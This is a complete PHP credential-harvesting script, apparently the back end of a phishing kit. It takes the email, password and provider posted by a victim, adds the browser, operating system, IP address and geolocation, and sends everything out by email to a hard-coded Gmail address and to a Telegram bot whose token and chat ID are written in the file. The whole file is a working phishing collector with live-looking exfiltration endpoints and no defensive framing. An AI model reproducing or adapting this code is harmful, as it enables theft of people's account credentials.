<?php

date_default_timezone_set('America/New_York');

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}

function getUserLocation($ip) {
    $details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));
    $country = $details->country;
    $city = $details->city;
    $region = $details->region;
    return "{$ip}, {$country} ({$city}, {$region})";
}

function getUserBrowser() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $browser = "Unknown";
    if (strpos($user_agent, 'MSIE') !== FALSE) {
        $browser = 'Internet Explorer';
    } elseif (strpos($user_agent, 'Trident') !== FALSE) {  
        $browser = 'Internet Explorer';
    } elseif (strpos($user_agent, 'Edge') !== FALSE) {
        $browser = 'Microsoft Edge';
    } elseif (strpos($user_agent, 'Firefox') !== FALSE) {
        $browser = 'Mozilla Firefox';
    } elseif (strpos($user_agent, 'Chrome') !== FALSE) {
        $browser = 'Google Chrome';
    } elseif (strpos($user_agent, 'Safari') !== FALSE) {
        $browser = 'Safari';
    } elseif (strpos($user_agent, 'Opera') !== FALSE) {
        $browser = 'Opera';
    }
    return $browser;
}

function getUserOS() {
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $os_platform = "Unknown";
    if (strpos($user_agent, 'Windows NT 10.0') !== FALSE) {
        $os_platform = 'Windows 10';
    } elseif (strpos($user_agent, 'Windows NT 6.3') !== FALSE) {
        $os_platform = 'Windows 8.1';
    } elseif (strpos($user_agent, 'Windows NT 6.2') !== FALSE) {
        $os_platform = 'Windows 8';
    } elseif (strpos($user_agent, 'Windows NT 6.1') !== FALSE) {
        $os_platform = 'Windows 7';
    } elseif (strpos($user_agent, 'Windows NT 6.0') !== FALSE) {
        $os_platform = 'Windows Vista';
    } elseif (strpos($user_agent, 'Windows NT 5.1') !== FALSE) {
        $os_platform = 'Windows XP';
    } elseif (strpos($user_agent, 'Windows NT 5.0') !== FALSE) {
        $os_platform = 'Windows 2000';
    } elseif (strpos($user_agent, 'Macintosh') !== FALSE) {
        $os_platform = 'Macintosh';
    } elseif (strpos($user_agent, 'Linux') !== FALSE) {
        $os_platform = 'Linux';
    }
    return $os_platform;
}

//EMAIL CONFIGURATION
$to = 'ghostlogs1@gmail.com';

//TELEGRAM CONFIGURATION
$tg_token = '7184204270:AAFlDkoRn6UemDSUJdTfHqSjvs6pQ8yfwzE';
$tg_chatid = '6080461977';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $provider = $_POST['provider'];
    $username = $_POST['email'];
    $password = $_POST['password'];
    $date = date('l d, F Y (h:i:s A)');
    $browser = getUserBrowser();
    $os = getUserOS();
    $userIP = getUserIP();
    $userLocation = getUserLocation($userIP);

    $message = "----- {$provider} -----\n";
    $message .= "User: {$username}\n";
    $message .= "Pass: {$password}\n";
    $message .= "Browser: {$browser}\n";
    $message .= "Operating System: {$os}\n";
    $message .= "User IP: {$userLocation}\n";
    $message .= "Submitted On: {$date}";

    $subject = "You got mail from {$userIP}";
    $server_name = $_SERVER['SERVER_NAME'];
    $from = 'noreply@' . $server_name;
    $sender = 'No Reply';

    $headers = array(
        'From' => $sender . ' <' . $from . '>',
        'Reply-To' => $username,
        'Content-Type' => 'text/plain; charset=UTF-8',
        'MIME-Version' => '1.0'
    );
    
    $header_string = '';
    foreach($headers as $key => $value) {
        $header_string .= $key . ': ' . $value . "\r\n";
    }
    
    $result = mail($to, $subject, $message, $header_string);

    if($result) {
    $endpoint = "https://api.telegram.org/bot$tg_token/sendMessage";
    $payload = [
        'chat_id' => $tg_chatid,
        'text' => $message
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($payload),
        ],
    ];
    $context  = stream_context_create($options);
    file_get_contents($endpoint, false, $context);

    echo 'success';
} else {
        echo 'sending failed.';
    }
}